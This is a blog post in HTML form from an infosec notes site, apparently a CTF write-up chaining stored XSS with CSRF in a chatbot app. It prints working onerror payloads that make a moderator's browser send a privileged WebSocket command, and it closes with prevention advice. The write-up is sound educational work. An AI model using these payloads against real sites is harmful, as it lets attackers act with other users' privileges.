@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This challenge highlight two issue at once: the very common Cross Site Scripting (XSS), Cross-site request forgery (CSRF) and how both vulnerabilities can be chained. Tl;Dr: You have to exploit a XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Misc CTF - XSS to CSRF">
+<meta property="og:url" content="https://hg8.sh/posts/misc-ctf/xss-to-csrf/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="This challenge highlight two issue at once: the very common Cross Site Scripting (XSS), Cross-site request forgery (CSRF) and how both vulnerabilities can be chained. Tl;Dr: You have to exploit a XSS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124015680-38e1ea80-d9e5-11eb-8c20-a33745d04fc2.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124015958-66c72f00-d9e5-11eb-8315-30f36da29f7c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124016068-85c5c100-d9e5-11eb-9e31-062182df5463.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124016183-a726ad00-d9e5-11eb-9962-37a4f7fd4f57.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124016326-d2a99780-d9e5-11eb-8ce4-0d27c5d87730.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124016442-f240c000-d9e5-11eb-8acf-637f5c720f9c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124016602-20be9b00-d9e6-11eb-91ea-f3653f1fe207.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124016822-54012a00-d9e6-11eb-9286-74d934010df6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/124017098-9b87b600-d9e6-11eb-81bb-2f0dbc20655c.gif">
+<meta property="article:published_time" content="2021-06-30T22:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-30T19:04:03.353Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="csrf">
+<meta property="article:tag" content="web socket">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/124015680-38e1ea80-d9e5-11eb-8c20-a33745d04fc2.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>Misc CTF - XSS to CSRF :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/misc-ctf/xxe-to-ssrf/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-site-Scripting-XSS"><span class="toc-number">2.</span> <span class="toc-text">Cross-site Scripting (XSS)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bad-words"><span class="toc-number">3.</span> <span class="toc-text">Bad words</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-site-Request-Forgery"><span class="toc-number">4.</span> <span class="toc-text">Cross-site Request Forgery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">5.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">6.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Examples"><span class="toc-number">7.</span> <span class="toc-text">Real Life Examples</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Misc CTF - XSS to CSRF
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2021-06-30T22:00:00.000Z" itemprop="datePublished">01-07-2021</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      4 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>This challenge highlight two issue at once: the very common Cross Site Scripting (XSS), Cross-site request forgery (CSRF) and how both vulnerabilities can be chained.</p>
+<p><strong>Tl;Dr:</strong> You have to exploit a XSS vulnerability chained with CSRF in order to access a protected Websocket endpoint.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge displays the following application:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124015680-38e1ea80-d9e5-11eb-8c20-a33745d04fc2.png" alt="misc ctf chatbot"></p>
+<p>We have a conversation bot. Sending random sentence doesn’t seem to do anything particular:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124015958-66c72f00-d9e5-11eb-8315-30f36da29f7c.png" alt="misc ctf chatbot chat"></p>
+<h2 id="Cross-site-Scripting-XSS"><a href="#Cross-site-Scripting-XSS" class="headerlink" title="Cross-site Scripting (XSS)"></a>Cross-site Scripting (XSS)</h2><p>While playing around we can quickly notice it’s possible to inject HTML. If we pass the message <code>&lt;s&gt;Hello&lt;/s&gt;</code> it gets displayed as HTML:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124016068-85c5c100-d9e5-11eb-9e31-062182df5463.png" alt="misc ctf html injection"></p>
+<p>This is open door to XSS right ? </p>
+<p>Let’s try a common one:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>The XSS payload gets executed when the message gets displayed:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124016183-a726ad00-d9e5-11eb-9962-37a4f7fd4f57.png" alt="misc ctf chatbot xss"></p>
+<p>Well that’s nice but it’s only Self-XSS so far, since a bot handled the conversation the XSS won’t trigger on its side…</p>
+<p>Let’s move on.</p>
+<h2 id="Bad-words"><a href="#Bad-words" class="headerlink" title="Bad words"></a>Bad words</h2><p>Then we notice this warning:</p>
+<blockquote>
+<p>This chatbot is a safe-place, badwords are prohibited!</p>
+</blockquote>
+<p>Well I wonder what will happen if we use “bad words”?</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124016326-d2a99780-d9e5-11eb-8ce4-0d27c5d87730.png" alt="misc ctf chatbot bad words"></p>
+<p>Interesting. It seems like a human is still interacting with some chat messages if they contains bad words. It’s good to know maybe we can use our XSS on the moderator side…</p>
+<p>Websocket</p>
+<p>Let’s now try to understand how the app is communicating with the server.<br>Opening our Browser Dev tools we don’t notice any HTTP requests being made but we can see a Websocket connection is opened.</p>
+<blockquote>
+<p>The WebSocket API is an technology that makes it possible to open a two-way interactive communication session between the user’s browser and a server. With this API, you can send messages to a server and receive event-driven responses without having to poll the server for a reply.</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API</a></p>
+</blockquote>
+<p>That make sense for our use case. Still using the browser dev tools it’s possible to looks at the messages sent and received from the server:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124016442-f240c000-d9e5-11eb-8acf-637f5c720f9c.png" alt="misc ctf chatbot websocket"></p>
+<p>Let’s now try to directly interact with the WebSocket (with a bit of luck maybe we could inject something directly?).</p>
+<p>Using the browser dev tool console we create we a new connexion with the server:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;ws://misc.ctf:33433/&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Then setup a little function to display on the console the server response:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123; <span class="built_in">console</span>.log(message.data); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>We should now be able to send and receive messages. Let’s give it a try:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.send(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">Unrecognized message, type /help <span class="keyword">for</span> a list <span class="keyword">of</span> command</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://user-images.githubusercontent.com/9076747/124016602-20be9b00-d9e6-11eb-91ea-f3653f1fe207.png" alt="misc ctf websocket chatbot connexion"></p>
+<p>This time we got a different kind of message from the server. Interesting. We can try the <code>/help</code> command:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.send(<span class="string">&#x27;/help&#x27;</span>)</span><br><span class="line">&#123; <span class="string">&quot;content&quot;</span>: <span class="string">&quot;&lt;message&gt;&quot;</span> &#125; to send a message</span><br><span class="line">/moderator to enter moderator mode <span class="keyword">debugger</span> </span><br></pre></td></tr></table></figure>
+
+<p>We got a command to enter moderator mode, that sound perfect:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; websocket.send(<span class="string">&#x27;/moderator&#x27;</span>)</span><br><span class="line">You need to be authenticated to execute <span class="built_in">this</span> command</span><br></pre></td></tr></table></figure>
+
+<p>That would have been too easy… But with all the informations we got so far we can probably find a way to access this endpoint right ?</p>
+<h2 id="Cross-site-Request-Forgery"><a href="#Cross-site-Request-Forgery" class="headerlink" title="Cross-site Request Forgery"></a>Cross-site Request Forgery</h2><p>We have XSS and a protected endpoint we need to access. It’s the perfect scenario for CSRF.</p>
+<blockquote>
+<p>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent<br>different websites from interfering with each other.</p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/9076747/124016822-54012a00-d9e6-11eb-9286-74d934010df6.png" alt="portswinger csrf"></p>
+<p>In our case we are going to use Cross-site Scripting in order to have a moderator access <code>/moderator</code> endpoint for us.</p>
+<p>We got a Javascript code to access <code>/moderator</code> endpoint using WebSocket:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;ws://&#x27;</span>+<span class="built_in">window</span>.location.host);</span><br><span class="line">ws.onopen = <span class="function">() =&gt;</span> ws.send(<span class="string">&#x27;/moderator&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Let’s include it to our XSS payload:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;ws=new WebSocket(&#x27;ws://&#x27;+window.location.host);ws.onopen=()=&gt;ws.send(&#x27;/moderator&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Last step, we need to include a “bad word” in our message so it gets transferred to a Moderator which have access to <code>/moderator</code> endpoint. The final payload should be the following:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🖕 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;ws=new WebSocket(&#x27;ws://&#x27;+window.location.host);ws.onopen=()=&gt;ws.send(&#x27;/moderator&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s send it as message and see the result:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/124017098-9b87b600-d9e6-11eb-81bb-2f0dbc20655c.gif" alt="misc ctf xss csrf flag"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">Cross-site scripting | Web Security Academy</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/">Cross Site Scripting</a><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/"> </a><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/">(XSS)</a><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/"> | OWASP</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">Cross-site request forgery</a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf"> </a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">(CSRF)</a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf"> | Web Security Academy</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/csrf">Cross Site Request Forgery</a><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/csrf"> </a><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/csrf">(CSRF)</a><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/csrf"> | OWASP</a></li>
+</ul>
+<h2 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h2><ul>
+<li><strong>Filter input on arrival.</strong> At the point where user input is received, filter as strictly as possible based on what is expected or valid input.</li>
+<li><strong>Encode data on output.</strong> At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.</li>
+<li><strong>Use appropriate response headers.</strong> To prevent XSS in HTTP responses that aren’t intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.</li>
+<li><strong>Content Security Policy.</strong> As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.</li>
+<li>See -&gt; <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross Site Scripting Prevention Cheat Sheet</a> for more.</li>
+</ul>
+<h2 id="Real-Life-Examples"><a href="#Real-Life-Examples" class="headerlink" title="Real Life Examples"></a>Real Life Examples</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/485748">Stored XSS on Twitter.com reports | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/438240">Reflected Cross site Scripting</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/438240"> </a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/438240">(XSS)</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/438240"> on Starbucks.com | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/419891">Cross-Site Request Forgery</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/419891"> </a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/419891">(CSRF)</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/419891"> vulnerability on API endpoint allows account takeovers | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/127703">Full account takeover using CSRF | HackerOne</a></li>
+</ul>
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Misc/">Misc</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/csrf/" rel="tag">csrf</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/web-socket/" rel="tag">web socket</a>, <a class="tag-link-link" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-site-Scripting-XSS"><span class="toc-number">2.</span> <span class="toc-text">Cross-site Scripting (XSS)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bad-words"><span class="toc-number">3.</span> <span class="toc-text">Bad words</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-site-Request-Forgery"><span class="toc-number">4.</span> <span class="toc-text">Cross-site Request Forgery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">5.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">6.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Examples"><span class="toc-number">7.</span> <span class="toc-text">Real Life Examples</span></a></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
